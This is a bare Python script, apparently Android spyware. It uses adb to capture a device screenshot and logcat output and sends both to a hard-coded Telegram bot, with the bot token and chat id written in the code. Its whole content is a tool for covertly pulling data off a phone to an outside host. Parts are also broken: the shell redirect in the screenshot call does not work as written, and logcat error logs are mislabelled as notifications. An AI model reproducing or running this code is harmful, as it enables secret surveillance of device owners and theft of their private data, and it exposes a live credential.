import subprocess
import requests

bot_token = "8000223881:AAGuNQnBiLX7O2p0QO7BRGCZlrUivW4wniQ"
chat_id = "5928551879"

def capture_screenshot():
    screenshot_path = '/sdcard/screenshot.png'
    subprocess.run(['adb', 'exec-out', 'screencap', '-p', f'>{screenshot_path}'], shell=True)
    return screenshot_path

def capture_notifications():
    notifications = subprocess.run(['adb', 'logcat', '-d', '*:E'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    return notifications

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {"chat_id": chat_id, "text": text}
    response = requests.post(url, data=data)
    return response

def send_telegram_file(file_path, caption="Screenshot"):
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    files = {'document': open(file_path, 'rb')}
    data = {'chat_id': chat_id, 'caption': caption}
    response = requests.post(url, files=files, data=data)
    return response

# Main Execution
screenshot = capture_screenshot()
send_telegram_file(screenshot, "Captured Screenshot")

notifications = capture_notifications()
send_telegram_message(f"Notifications: {notifications}")
